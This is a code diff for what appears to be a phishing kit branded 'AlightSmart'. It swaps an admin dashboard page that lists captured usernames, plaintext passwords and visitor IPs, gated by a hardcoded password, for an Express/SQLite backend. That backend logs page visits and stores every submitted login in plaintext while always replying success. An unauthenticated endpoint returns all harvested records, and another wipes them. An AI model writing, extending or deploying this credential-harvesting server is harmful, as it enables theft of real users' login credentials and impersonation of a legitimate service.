@@ -1,112 +1,61 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AlightSmart Admin</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
-        .container { max-width: 1400px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .header { background: #1e40af; color: white; padding: 25px; text-align: center; }
-        .section { margin: 25px; }
-        h2 { color: #1e40af; margin-bottom: 10px; }
-        table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
-        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
-        th { background: #e2e8f0; }
-        .clear-btn { background: #ef4444; color: white; padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🔐 AlightSmart Admin Dashboard</h1>
-            <p>Secure Access</p>
-        </div>
+const express = require('express');
+const path = require('path');
+const sqlite3 = require('sqlite3').verbose();
 
-        <!-- Section 1: Login Records -->
-        <div class="section">
-            <h2>1. Login Records (Username & Password)</h2>
-            <table id="loginTable">
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>Username / Email</th>
-                        <th>Password</th>
-                        <th>IP</th>
-                    </tr>
-                </thead>
-                <tbody></tbody>
-            </table>
-        </div>
+const app = express();
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
 
-        <!-- Section 2: Page Visits -->
-        <div class="section">
-            <h2>2. Page Visits (Before Login)</h2>
-            <table id="visitTable">
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>Type</th>
-                        <th>IP Address</th>
-                    </tr>
-                </thead>
-                <tbody></tbody>
-            </table>
-        </div>
+const db = new sqlite3.Database('./login_records.db');
 
-        <button class="clear-btn" onclick="clearRecords()">Clear All Records</button>
-    </div>
+db.run(`CREATE TABLE IF NOT EXISTS records (
+    id INTEGER PRIMARY KEY,
+    type TEXT,
+    username TEXT,
+    password TEXT,
+    ip TEXT,
+    timestamp TEXT
+)`);
 
-    <script>
-        const ADMIN_PASSWORD = "tunde6035";
+function saveRecord(type, username = null, password = null, ip = 'Unknown') {
+    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
+    db.run("INSERT INTO records (type, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
+        [type, username, password, ip, timestamp]);
+}
 
-        async function loadRecords() {
-            const res = await fetch('/api/records');
-            const records = await res.json();
+// Record visits immediately
+app.get('/', (req, res) => {
+    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
-            const loginBody = document.querySelector('#loginTable tbody');
-            const visitBody = document.querySelector('#visitTable tbody');
-            loginBody.innerHTML = "";
-            visitBody.innerHTML = "";
+app.get('/login.html', (req, res) => {
+    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
 
-            records.forEach(r => {
-                if (r.type === "Login Attempt") {
-                    loginBody.innerHTML += `
-                        <tr>
-                            <td>${r.timestamp}</td>
-                            <td><strong>${r.username || '-'}</strong></td>
-                            <td><code>${r.password}</code></td>
-                            <td>${r.ip || '-'}</td>
-                        </tr>`;
-                } else {
-                    visitBody.innerHTML += `
-                        <tr>
-                            <td>${r.timestamp}</td>
-                            <td>${r.type}</td>
-                            <td>${r.ip || '-'}</td>
-                        </tr>`;
-                }
-            });
-        }
+app.post('/api/login', (req, res) => {
+    const { username, password } = req.body;
+    saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    res.json({ success: true });
+});
 
-        window.onload = () => {
-            const pass = prompt("Enter Admin Password:");
-            if (pass === ADMIN_PASSWORD) {
-                loadRecords();
-                setInterval(loadRecords, 3000);
-            } else {
-                alert("❌ Wrong Password");
-                window.location.href = "/";
-            }
-        };
+app.get('/api/records', (req, res) => {
+    db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
+        res.json(rows);
+    });
+});
 
-        async function clearRecords() {
-            if (confirm("Clear all records?")) {
-                await fetch('/api/clear', { method: 'POST' });
-                loadRecords();
-            }
-        }
-    </script>
-</body>
-</html>
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+app.post('/api/clear', (req, res) => {
+    db.run("DELETE FROM records");
+    res.json({ message: 'Cleared' });
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Server running`);
+});
